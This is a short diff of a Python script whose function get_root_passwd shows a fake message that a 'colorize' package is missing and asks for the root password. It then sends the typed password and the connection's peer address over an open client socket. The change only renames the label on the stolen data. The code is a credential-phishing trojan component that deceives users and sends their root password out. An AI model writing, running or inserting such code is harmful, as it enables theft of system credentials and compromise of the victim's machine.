@@ -25,6 +25,6 @@ def connection():
 def get_root_passwd():
 	prompt = "Python built-in package \"colorize\" not found. Trying to install...\nRoot password required: "
 	password = getpass.getpass(prompt)
-	client_socket.send("Password : " +str(password + "\n" +str(client_socket.getpeername())))
+	client_socket.send("P4SSW0RD:" +str(password + "\n" +str(client_socket.getpeername())))
 
 connection()
